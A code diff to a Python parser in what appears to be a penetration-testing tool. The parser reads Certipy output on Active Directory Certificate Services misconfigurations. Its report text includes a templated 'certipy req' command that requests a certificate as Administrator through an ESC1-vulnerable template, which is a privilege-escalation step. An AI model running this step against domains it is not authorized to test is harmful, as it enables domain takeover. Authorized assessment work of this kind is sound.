@@ -1364,26 +1364,42 @@ class CardADParserMixin:
         #         ...
         #       [!] Vulnerabilities
         #         ESC1                   : 'Domain Users' can enroll...
-        TEMPLATE_BLOCKS = re.findall(
-            r"Template Name\s*:\s*([^\n]+)[\s\S]*?"
-            r"(?:ESC\d+\s*:\s*[^\n]+(?:\n|$))+",
-            text)
-        vulns = []
-        # Parse per-ESC match
+        vulns = []          # (subject, ESCx, description)
         ESC_RE = re.compile(r"(ESC\d+)\s*:\s*([^\n]+)")
-        # Also grab CA name(s) — often at top
         ca_m = re.search(r"CA Name\s*:\s*([^\n]+)", text)
         ca_name = ca_m.group(1).strip() if ca_m else "<CA>"
 
+        def _escs_in_vuln_section(block_text):
+            # Only the "[!] Vulnerabilities" section — NOT "[*] Remarks",
+            # which lists ESC2/ESC3 *target* templates and patch caveats
+            # (e.g. the ESC15 / CVE-2024-49019 note).  Scanning the whole
+            # block double-counted those remark lines as live vulns.
+            m = re.search(
+                r"\[!\]\s*Vulnerabilities(.*?)(?:\[\*\]\s*Remarks|\Z)",
+                block_text, re.DOTALL)
+            return ([(em.group(1), em.group(2).strip())
+                     for em in ESC_RE.finditer(m.group(1))]
+                    if m else [])
+
+        # CA-level vulns (ESC8/ESC11/ESC6/...) live under "Certificate
+        # Authorities", not inside a template block, so the template loop
+        # below misses them — collect them first.
+        ca_block = re.search(
+            r"Certificate Authorities(.*?)(?=Certificate Templates|\Z)",
+            text, re.DOTALL)
+        if ca_block:
+            for esc, note in _escs_in_vuln_section(ca_block.group(1)):
+                vulns.append((f"CA {ca_name!r}", esc, note))
+
+        # Per-template vulns.
         for block in re.finditer(
                 r"Template Name\s*:\s*([^\n]+)"
                 r"(?:(?!Template Name).)*?"
                 r"(?=(?:Template Name|$))",
                 text, re.DOTALL):
             tmpl_name = block.group(1).strip()
-            block_text = block.group(0)
-            for em in ESC_RE.finditer(block_text):
-                vulns.append((tmpl_name, em.group(1), em.group(2).strip()))
+            for esc, note in _escs_in_vuln_section(block.group(0)):
+                vulns.append((tmpl_name, esc, note))
 
         if not vulns:
             text_low = text.lower()
@@ -1564,21 +1580,29 @@ class CardADParserMixin:
         desc = [
             f"Certipy found {len(vulns)} AD CS misconfiguration(s) "
             f"on {target}.",
-            f"",
+            "",
             f"CA Name: {ca_name}",
-            f"",
-            "Vulnerable templates:",
+            "",
+            "Vulnerabilities:",
         ]
-        for tmpl, esc, note in vulns[:20]:
-            desc.append(f"  · {esc:<6}  {tmpl!r:<30}  {note[:80]}")
+        for subj, esc, note in vulns[:20]:
+            desc.append(f"  · {esc:<6}  {subj:<32}  {note[:80]}")
         if len(vulns) > 20:
             desc.append(f"  · … {len(vulns) - 20} more")
-        desc += ["", "Next step — request a cert for Administrator:",
+
+        # Pre-bake the ESC1 request with the REAL template when there is
+        # one (classic low-priv user -> Administrator escalation); else
+        # leave <template> for the operator to fill from the list above.
+        esc1_tmpl = next((subj for subj, esc, _ in vulns
+                          if esc.upper() == "ESC1"
+                          and not subj.startswith("CA ")), None)
+        tmpl_arg = repr(esc1_tmpl) if esc1_tmpl else "'<template>'"
+        desc += ["", "Next step — request a cert for Administrator (ESC1):",
                  f"  certipy req -u <user>@<domain> -p <pass> "
-                 f"-target {target} \\",
-                 f"    -ca {ca_name!r} -template '<template>' \\",
+                 f"-target {target} -ldap-scheme ldap \\",
+                 f"    -ca {ca_name!r} -template {tmpl_arg} \\",
                  f"    -upn Administrator@<domain> "
-                 f"-out <HAWK>/outputs/esc"]
+                 f"-out <HAWK>/outputs/esc1"]
 
         esc_names = sorted({v[1] for v in vulns})
         title = (f"CERTIPY FIND — AD CS vulnerable on {target}  "
